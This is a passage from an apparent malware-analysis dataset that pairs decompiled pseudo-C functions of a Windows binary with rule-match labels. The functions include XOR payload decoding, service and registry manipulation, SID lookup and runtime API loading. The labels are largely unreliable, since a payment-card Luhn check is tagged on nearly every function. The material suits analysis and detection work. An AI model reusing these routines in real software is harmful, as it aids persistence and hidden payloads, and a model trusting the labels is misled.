>> 8;\n    uStack23 = puVar23 >> 0x10;\n    uStack5 = 0xe;\n    uStack9 = 0x10;\n    uStack8 = 0x70;\n    uStack7 = 0x40;\n    uStack13 = 0x28;\n    uStack12 = 0x4a;\n    uStack11 = 0x40;\n    fcn.004039e0();\n    uStack5 = 0xe;\n    uStack9 = 0x10;\n    uStack8 = 0x70;\n    uStack7 = 0x40;\n    uStack13 = 0x53;\n    uStack12 = 0x4a;\n    uStack11 = 0x40;\n    fcn.004039e0();\n    uStack5 = 0xe;\n    uStack9 = 0x10;\n    uStack8 = 0x70;\n    uStack7 = 0x40;\n    uStack13 = 0x81;\n    uStack12 = 0x4a;\n    uStack11 = 0x40;\n    fcn.004039e0();\n    return;\n}\n",
        "token_count": 9009
    },
    "00403d10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00403d10(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00403a50;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x4114c0;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 220
    },
    "00402f70": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402f8d) overlaps instruction at (ram,0x00402f89)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nvoid __fastcall fcn.00402f70(uint param_1, uint8_t *param_2, int32_t param_3)\n\n{\n    code *pcVar1;\n    int32_t in_EAX;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    bool in_CF;\n    bool in_ZF;\n    uint uStack8;\n    \n    if ((in_CF || in_ZF) || (!in_CF && !in_ZF)) {\n        uStack8 = 0;\n        in_EAX = param_3;\n    }\n    *unaff_EDI = *unaff_ESI;\n    *param_2 = *param_2 | param_1 >> 8;\n    *(in_EAX + -4) = 0x80;\n    *(in_EAX + -8) = 3;\n    *(in_EAX + -0xc) = 0;\n    *(in_EAX + -0x10) = 1;\n    *(in_EAX + -0x14) = 0xc0000000;\n    *(in_EAX + -0x18) = &stack0xfffffff8;\n    pcVar1 = _sym.imp.KERNEL32.dll_CreateFileA;\n    *(in_EAX + -0x1c) = 0x402fa9;\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 336
    },
    "004015c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.004015c0(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_8h = 0;\n    if (arg_14h != 0) {\n        do {\n            *(var_8h + arg_10h) = *(var_8h + arg_10h) ^ *(var_8h % arg_ch + arg_8h);\n            var_8h = var_8h + 1;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00401640": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004016b4) overlaps instruction at (ram,0x004016b3)\n// \n// WARNING: Variable defined which should be unmapped: var_10ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00401640(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint *unaff_EDI;\n    bool bVar7;\n    ulong uVar8;\n    int32_t iStack273;\n    uint var_10ch;\n    uchar auStack32 [20];\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    var_10ch._0_3_ = iStack273 >> 8;\n    uVar8 = fcn.00401010(0x80000002, str.Wa, 0x407340, &var_8h, &var_10ch, &var_4h);\n    bVar7 = uVar8 == 0;\n    if (bVar7) {\n        return 0;\n    }\n    if ((!bVar7) && (bVar7)) {\n        uVar1 = in(uVar8 >> 0x20);\n        *unaff_EDI = uVar1;\n        pcVar4 = _sym.imp.USER32.dll_GetMessageA;\n        if (0 < &var_10ch) {\n    // WARNING: Could not recover jumptable at 0x004016b9. Too many branches\n    // WARNING: Treating indirect jump as call\n            uVar5 = (**(uVar8 >> 0x20))();\n            return uVar5;\n        }\n        stack0xfffffef3 = 0;\n        iStack273 = 0;\n        iVar6 = (*_sym.imp.USER32.dll_GetMessageA)(auStack32, 0, 0);\n        pcVar3 = _sym.imp.USER32.dll_TranslateMessage;\n        pcVar2 = _sym.imp.USER32.dll_GetDesktopWindow;\n        while (iVar6 != 0) {\n            (*pcVar3)(0xe0);\n            (*pcVar2)();\n            (*_sym.imp.USER32.dll_DispatchMessageA)(auStack32);\n            iVar6 = (*pcVar4)(auStack32, 0, 0, 0);\n        }\n        return 0;\n    }\n    iStack273 = var_10ch << 8;\n    iVar6 = (*_sym.imp.MSVCRT.dll__access)();\n    return iVar6 != -1;\n}\n",
        "token_count": 582
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl main(uint argv)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint lpMsg;\n    \n    iVar4 = fcn.00403d10(argv);\n    if ((iVar4 != 0) && (iVar5 = fcn.00403410(argv),  pcVar3 = _sym.imp.USER32.dll_GetMessageA,  iVar5 != 0)) {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageA)(&lpMsg, 0, 0, 0);\n        pcVar2 = _sym.imp.USER32.dll_TranslateMessage;\n        pcVar1 = _sym.imp.USER32.dll_GetDesktopWindow;\n        while (iVar5 != 0) {\n            (*pcVar2)(&lpMsg);\n            (*pcVar1)();\n            (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n            iVar5 = (*pcVar3)(&lpMsg, 0, 0, 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 241
    },
    "00401960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401960(uint arg_8h, uint arg_ch)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    fcn.004026a0(hSCManager, arg_8h);\n    uVar1 = fcn.00403860(hSCManager, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 129
    },
    "004019e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004019e0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t unaff_EDI;\n    bool bVar3;\n    bool bVar4;\n    \n    uVar2 = 0;\n    bVar3 = false;\n    bVar4 = arg_ch == 0;\n    if (!bVar4) {\n        do {\n            if ((!bVar3 && !bVar4) && (bVar3 || bVar4)) {\n                uVar2 = unaff_EDI;\n            }\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n            bVar3 = uVar2 < arg_ch;\n            bVar4 = uVar2 == arg_ch;\n        } while (bVar3);\n    }\n    return;\n}\n",
        "token_count": 224
    },
    "00401bf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401bf0(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "00402710": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402770) overlaps instruction at (ram,0x0040276f)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00402762)\n// WARNING: Removing unreachable block (ram,0x0040276c)\n// WARNING: Removing unreachable block (ram,0x00402770)\n\nuint __cdecl fcn.00402710(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar lpBuffer;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    puVar2 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    s = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    // WARNING: Bad instruction - Truncating control flow here\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x34, *0x10 + -0x214, arg_8h);\n    fcn.00403f90(*0x10 + -8, 0xf4);\n    fcn.00402860(var_4h);\n    iVar1 = fcn.00403bd0(&s, var_4h, var_8h);\n    if (iVar1 != 0) {\n        fcn.00401780(&s, 0xffffffff);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 500
    },
    "00402a40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402a40(void)\n\n{\n    uint uVar1;\n    \n    if (*0x4244f4 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x4244f4 = 1;\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "00402ce0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402d3b) overlaps instruction at (ram,0x00402d38)\n// \n\nvoid __cdecl fcn.00402ce0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint extraout_EDX;\n    uint arg_ch_00;\n    uint *puVar2;\n    bool bVar3;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    bVar3 = puVar2 == -3;\n    fcn.00402aa0(&var_68h, &var_4h);\n    arg_ch_00 = var_4h;\n    if ((!bVar3) && (bVar3)) {\n        arg_ch_00 = extraout_EDX;\n    }\n    fcn.004015c0(&var_68h, arg_ch_00, 0x4074a0, 0xa020);\n    *arg_8h = 0x4074a0;\n    *arg_ch = 0xa020;\n    return;\n}\n",
        "token_count": 343
    },
    "00402ed0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402f2e) overlaps instruction at (ram,0x00402f2d)\n// \n// WARNING: Removing unreachable block (ram,0x00402f1e)\n\nbool fcn.00402ed0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    bool bVar5;\n    char *var_4h;\n    \n    var_4h = NULL;\n    iVar2 = fcn.00403620(&var_4h);\n    bVar5 = iVar2 == 0;\n    if (bVar5) {\n        return false;\n    }\n    if ((!bVar5) && (bVar5)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = var_4h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071e8, 0x407228, 1, var_4h, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 347
    },
    "004033d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004033d0(uint arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    bool in_PF;\n    \n    puVar4 = &stack0xfffffffc;\n    if ((!in_PF) && (in_PF)) {\n        puVar5 = &stack0xfffffff8;\n        cVar1 = '\\x1e';\n        do {\n            puVar4 = puVar4 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar4;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar2 = in(0x78);\n        return uVar2;\n    }\n    iVar3 = fcn.004041c0(arg_8h, 1);\n    return iVar3 != 0;\n}\n",
        "token_count": 214
    },
    "00403480": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004034d3) overlaps instruction at (ram,0x004034cf)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x004034b0)\n\nuint fcn.00403480(uint *param_1, uint *param_2)\n\n{\n    uint8_t *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uchar *extraout_ECX;\n    bool bVar5;\n    uchar *puStack20;\n    uchar *puStack16;\n    \n    puVar3 = param_2;\n    puVar2 = param_1;\n    puStack16 = &stack0x00000008;\n    puStack20 = &stack0x00000004;\n    puVar4 = fcn.00404360(param_1, param_2);\n    bVar5 = puVar4 == NULL;\n    if (!bVar5) {\n        *(puVar4 + 0x58) = param_2;\n        if ((bVar5) || (puStack16 = extraout_ECX,  !bVar5)) {\n            puVar4 = &stack0x00000008;\n            puStack20 = &stack0x00000004;\n            puStack16 = puVar4;\n        }\n        *puVar2 = *puVar3;\n        puVar1 = (&stack0xffffffec | 0x8d) + 0x51;\n        *puVar1 = *puVar1 | param_2;\n        *(puVar4 + -4) = puVar3 + 1;\n        *(puVar4 + -8) = puVar2 + 1;\n        *(puVar4 + -0xc) = 0x4034e2;\n        fcn.00404360();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 420
    },
    "004034f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nint32_t fcn.004034f0(void)\n\n{\n    int32_t iVar1;\n    bool in_OF;\n    \n    if ((!in_OF) && (in_OF)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 97
    },
    "00403620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get user security identifier"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004036ca) overlaps instruction at (ram,0x004036c9)\n// \n\nuint __cdecl fcn.00403620(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t unaff_EBX;\n    bool bVar3;\n    uint var_31ch;\n    uint lpBuffer;\n    uint var_114h;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    pcbBuffer = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &pcbBuffer);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    uVar2 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &var_114h, &var_4h, &var_31ch, &var_8h, &var_10h);\n    bVar3 = (POPCOUNT(uVar2 & 0xff) & 1U) != 0;\n    if (uVar2 != 0) {\n        if ((bVar3) && (!bVar3)) {\n            *(unaff_EBX + -0x7a72f7ab) = *(unaff_EBX + -0x7a72f7ab) | 0xffffffec;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&var_114h, arg_8h);\n        if (iVar1 != 0) {\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 435
    },
    "004038d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040391f) overlaps instruction at (ram,0x0040391d)\n// \n\nuint8_t * __cdecl fcn.004038d0(uint8_t *arg_8h, uint32_t arg_ch, uint8_t *arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t in_ECX;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    bool bVar5;\n    \n    puVar2 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h != 0) {\n        iVar1 = arg_8h - puVar2;\n        if (arg_8h <= puVar2) {\n            do {\n                if ((iVar1 < 0) || (iVar1 >= 0)) {\n                    in_ECX = *arg_8h;\n                    arg_ch = *arg_10h;\n                }\n                if (in_ECX == arg_ch) {\n                    in_ECX = arg_14h - 1;\n                    arg_ch = 0;\n                    bVar5 = true;\n                    puVar3 = arg_8h + 0x168a088b;\n                    puVar4 = arg_10h;\n                    do {\n                        puVar4 = puVar4 + 1;\n                        if (in_ECX == 0) break;\n                        in_ECX = in_ECX - 1;\n                        bVar5 = *puVar3 == *puVar4;\n                        puVar3 = puVar3 + 1;\n                    } while (bVar5);\n                    if (bVar5) {\n                        return arg_8h + 0x168a088a;\n                    }\n                }\n                arg_8h = arg_8h + 0x168a088b;\n                iVar1 = arg_8h - puVar2;\n            } while (arg_8h < puVar2 || iVar1 == 0);\n        }\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 465
    },
    "00403a50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403a93) overlaps instruction at (ram,0x00403a91)\n// \n\nvoid __cdecl fcn.00403a50(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t unaff_ESI;\n    uint32_t uVar4;\n    uchar uVar5;\n    bool bVar6;\n    uchar uVar7;\n    uchar uVar8;\n    uchar uStack23;\n    \n    if (arg_ch == 1) {\n        uVar8 = unaff_ESI;\n        uStack23 = unaff_ESI >> 8;\n        uVar4 = unaff_ESI;\n        while( true ) {\n            uVar4 = uVar4 & 0xffff0000 | uVar4 + 1;\n            uVar5 = uVar4 < 0x222c;\n            uVar7 = SBORROW4(uVar4, 0x222c);\n            bVar6 = uVar4 - 0x222c < 0;\n            uVar4 = unaff_ESI & 0xffff0000 | CONCAT11(uStack23, uVar8);\n            uVar2 = fcn.004044d0();\n            if ((bVar6) || (!bVar6)) break;\n            puVar3 = uVar2 - 0x292718;\n            *0x1 = *0x1 - 1;\n            *0x1 = *0x1 - 1 & 0xffffff00 | *0x1 - (0x292717 < uVar2);\n            uVar1 = puVar3;\n            uVar5 = CARRY1(*puVar3, uVar1);\n            uVar7 = SCARRY1(*puVar3, uVar1);\n            *puVar3 = *puVar3 + uVar1;\ncode_r0x00403a9e:\n            if (!uVar5) goto code_r0x00403abd;\n            uVar8 = 0xf8;\n            uStack23 = 0xb7;\n            if (&stack0xfffffff0 < *puVar3 || puVar3 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        }\n        puVar3 = fcn.00401170();\n        if (!uVar5) goto code_r0x00403a9e;\ncode_r0x00403abd:\n        fcn.00402470();\n        if ((!uVar7) && (uVar7)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        if (*0x4244fc == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.004031c0();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 695
    },
    "00403f90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403fce) overlaps instruction at (ram,0x00403fcd)\n// \n// WARNING: Removing unreachable block (ram,0x00403fc0)\n// WARNING: Removing unreachable block (ram,0x00403fca)\n// WARNING: Removing unreachable block (ram,0x00403fce)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00403f90(uint *param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar uStack108;\n    uint uStack107;\n    uint uStack8;\n    \n    uStack8 = 0;\n    uStack108 = 0;\n    puVar2 = &uStack107;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00403d70(&uStack108, &uStack8);\n    fcn.004015c0(&uStack108, uStack8, 0x4114c4, 0x13000);\n    *param_1 = 0x4114c4;\n    *param_2 = 0x13000;\n    return;\n}\n",
        "token_count": 323
    },
    "00404030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain pusha popa sequence"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404030(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    uint var_4h;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    uVar1 = fcn.00404090(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 116
    },
    "00404120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004041af) overlaps instruction at (ram,0x004041ae)\n// \n// WARNING: Type propagation algorithm not settling\n\nuint fcn.00404120(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    char **ppcVar4;\n    uint32_t extraout_ECX;\n    uint8_t extraout_DL;\n    int32_t unaff_EBX;\n    bool bVar5;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x407114);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (uVar2 == 0) {\n        return 0;\n    }\n    bVar5 = uVar2 < extraout_ECX;\n    *0x424504 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, 0x407124);\n    if ((bVar5) || (!bVar5)) {\n        *0x424508 = (*pcVar1)(uVar2, 0x407140);\n    }\n    else {\n        iVar3 = *0x424504 + 0x7c8ecb0d + (bVar5 == false);\n        *(uVar2 + 0x43d1773a) = *(uVar2 + 0x43d1773a) ^ 0x6827e95e;\n        ppcVar4 = iVar3 + 1;\n        if (!SCARRY4(iVar3, 1)) {\n            *ppcVar4 = *ppcVar4 + ppcVar4;\n            *ppcVar4 = *ppcVar4 + ppcVar4;\n            return 1;\n        }\n        *(uVar2 - 1) = *(uVar2 - 1) + extraout_DL;\n        *0x424508 = ppcVar4 & 0xffffff00 | *(unaff_EBX + (ppcVar4 & 0xff));\n    }\n    *0x42450c = (*pcVar1)(uVar2, 0x407150);\n    if (((*0x424504 != 0) && (*0x424508 != 0)) && (*0x42450c != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 514
    },
    "00401e10": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00401e10(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    bool bVar7;\n    bool bVar8;\n    uchar auStack592 [260];\n    uchar uStack332;\n    uint uStack331;\n    int32_t var_44h;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint uStack56;\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    int32_t *piStack40;\n    int32_t *piStack36;\n    int32_t iStack32;\n    uint uStack28;\n    int32_t *piStack24;\n    int32_t *piStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x405260;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x407408);\n    bVar7 = false;\n    bVar8 = iVar1 == 0;\n    if (bVar8) {\n        *in_FS_OFFSET = uStack16;\n        return 1;\n    }\n    var_44h = iVar1;\n    uVar2 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x407414);\n    if ((!bVar7 && !bVar8) && (bVar7 || bVar8)) {\n        uVar2 = uVar2 & 0xe2f4cc58;\n    }\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(param_1, uVar2, 0, 0, 2, 1000, &uStack28);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x407428);\n    if (pcVar3 == NULL) {\n        *in_FS_OFFSET = uStack16;\n        return 1;\n    }\n    piStack36 = NULL;\n    uStack8 = 0;\n    iVar4 = (*pcVar3)(uStack28, str._D_3, 0, &piStack36);\n    if ((iVar4 < 0) || (piStack36 == NULL)) {\n        uStack8 = 0xffffffff;\n        if (piStack36 != NULL) {\n            (**(*piStack36 + 8))(piStack36);\n        }\n    }\n    else {\n        piStack40 = NULL;\n        uStack8._0_1_ = 1;\n        iVar4 = (**(*piStack36 + 0x20))(piStack36, &piStack40);\n        if ((iVar4 < 0) || (piStack40 == NULL)) {\n            uStack8 = uStack8._1_3_ << 8;\n            if (piStack40 != NULL) {\n                (**(*piStack40 + 8))(piStack40);\n            }\n            uStack8 = 0xffffffff;\n            if (piStack36 != NULL) {\n                (**(*piStack36 + 8))(piStack36);\n            }\n        }\n        else {\n            iStack32 = 0;\n            (**(*piStack40 + 0x24))(piStack40, &iStack32);\n            iStack68 = 0;\n            if (0 < iStack32) {\n                do {\n                    iStack48 = (*_sym.imp.MSVCRT.dll_rand)();\n                    iStack48 = iStack48 % iStack32;\n                    uStack56 = CONCAT22(uStack56._2_2_, 3);\n                    param_1 = NULL;\n                    piStack20 = NULL;\n                    uStack8._0_1_ = 4;\n                    iVar4 = (**(*piStack40 + 0x2c))\n                                      (piStack40, uStack56, uStack52, iStack48, uStack44, uStack56, uStack52, iStack48, \n                                       uStack44, &param_1);\n                    if ((iVar4 < 0) || (param_1 == NULL)) {\n                        uStack8._0_1_ = 3;\n                        if (piStack20 != NULL) {\n                            (**(*piStack20 + 8))(piStack20);\n                        }\njoined_r0x0040223a:\n                        uStack8._0_1_ = 2;\n                        if (param_1 != NULL) {\n                            uStack8._0_1_ = 2;\n                            (**(*param_1 + 8))(param_1);\n                        }\ncode_r0x00402246:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&uStack56);\n                        break;\n                    }\n                    iVar4 = (***param_1)(param_1, 0x4061b0, &piStack20);\n                    if (((iVar4 < 0) || (piStack20 == NULL)) ||\n                       (iVar4 = (**(*piStack20 + 0x38))(piStack20, 